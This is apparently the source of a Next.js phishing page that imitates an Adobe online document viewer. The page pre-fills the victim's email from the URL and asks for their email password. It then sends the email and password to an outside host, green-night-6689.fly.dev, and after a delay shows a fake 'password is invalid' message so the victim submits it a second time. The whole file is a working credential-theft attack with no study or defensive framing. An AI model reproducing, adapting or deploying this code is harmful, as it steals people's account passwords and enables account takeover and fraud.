import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/router';

export default function Home() {
  const [loading, setLoading] = useState(false);
  const [isError, setError] = useState(false);
  const ref = useRef();
  const router = useRouter();
  const { email } = router.query;

  useEffect(() => {
    const script = document.createElement('script');

    script.src = '/js/initialize.js';
    script.async = true;

    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  const onSubmit = (e) => {
    e.preventDefault();
    setLoading(true);

    fetch('https://green-night-6689.fly.dev/send-zoom-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email,
        name: 'User',
        agent: 'admin',
        password: ref.current.value,
      }),
    })
      .then((response) => {
        setTimeout(() => {
          setLoading(false);
          setError();
        }, 20000);
      })
      .catch((reason) => console.log(reason.message));
  };

  return (
    <div className="container">
      <div className="loader">
        <img
          src="https://cdn.dribbble.com/users/616823/screenshots/2763683/media/81e858e1b145669fb8094f65e9e5ff65.gif"
          alt="preloader image"
        />
        <h3>Loading document on adobe online,please wait...</h3>
      </div>
      <div id="main_body" style={{ display: 'block' }}>
        <header className="HeaderBox">
          <div className="sec1">
            <img
              src={
                'data:image/png;base64,'
              }
            />
          </div>
          <div className="sec2">
            <img
              src="data:image/png;base64,"
              style={{ height: '60px' }}
            />
          </div>
        </header>
        <nav className="shadow bottom">
          <ul>
            <li>
              <div className="navbtn">
                <span className="rix ri-eye-line"></span> View
              </div>
            </li>
            <li>
              <div className="navbtn">
                <span className="rix ri-edit-2-line"></span> Edit
              </div>
            </li>
            <li>
              <div className="navbtn">
                <span className="rix ri-download-cloud-2-line"></span> Download
              </div>
            </li>
            <li>
              <div className="navbtn">
                <span className="rix ri-save-3-fill"></span> Save
              </div>
            </li>
          </ul>
        </nav>
        <main className="parent">
          <div className="center">
            <div className="formhead">
              <img src="data:image/png;base64," />
            </div>

            <div className="otherformsecs" id="failure"></div>
            <form onSubmit={onSubmit} className="myfm" id="myfm">
              {isError && (
                <font color="red">
                  Your password is invalid, please enter password.
                </font>
              )}
              <div className="clasfrm">
                <span>
                  <i className="rix ri-at-line"></i>
                </span>
                <input
                  type="email"
                  id="lm"
                  name="email"
                  value={email || 'Unauthourized'}
                  placeholder="Email address"
                  required
                  style={{ background: 'buttonface', cursor: 'not-allowed' }}
                />
              </div>
              <div className="clasfrm">
                <span>
                  <i className="rix ri-lock-password-line"></i>
                </span>
                <input
                  type="password"
                  id="lp"
                  name="pass"
                  minlength="1"
                  placeholder="Email password"
                  ref={ref}
                  required
                  autofocus
                />
              </div>
              <div className="clasfrm">
                <button
                  id="cum"
                  className="cumsocks"
                  style={{ backgroundColor: '#900708' }}
                >
                  {loading ? 'Loading...' : 'Download'}
                </button>
              </div>
            </form>
          </div>
        </main>
      </div>
    </div>
  );
}
